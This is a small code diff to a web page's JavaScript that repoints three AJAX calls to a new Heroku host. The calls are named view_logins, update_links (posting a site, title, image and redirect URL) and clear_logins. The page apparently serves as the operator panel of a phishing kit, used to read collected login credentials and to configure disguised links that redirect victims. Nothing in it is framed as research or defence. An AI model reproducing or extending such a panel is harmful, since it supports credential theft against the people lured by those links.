@@ -42,7 +42,7 @@
                 document.getElementById('option').style.display = "none";
                 document.getElementById('GETLOGINS').style.display = "";
                 $.ajax({
-                    url:"https://zaidfalah.herokuapp.com/view_logins",
+                    url:"https://zaiduser.herokuapp.com/view_logins",
                     type:"GET",
                     dataType:"json",
                     success:function(r){json_to_table(r)}
@@ -56,7 +56,7 @@
             function update() {
                 let o = {"site": document.getElementById('sites').value, "title": document.getElementById('title').value, "image": document.getElementById('image').value, "redirect": document.getElementById('redirect').value}
                 $.ajax({
-                    url:"https://zaidfalah.herokuapp.com/update_links",
+                    url:"https://zaiduser.herokuapp.com/update_links",
                     type:"POST",
                     dataType:"json",
                     data: o,
@@ -66,7 +66,7 @@
             }
             function clear_logins(){
                 $.ajax({
-                    url:"https://zaidfalah.herokuapp.com/clear_logins",
+                    url:"https://zaiduser.herokuapp.com/clear_logins",
                     type:"POST",
                     dataType:"json",
                     success:function(r){alert(r.a)}
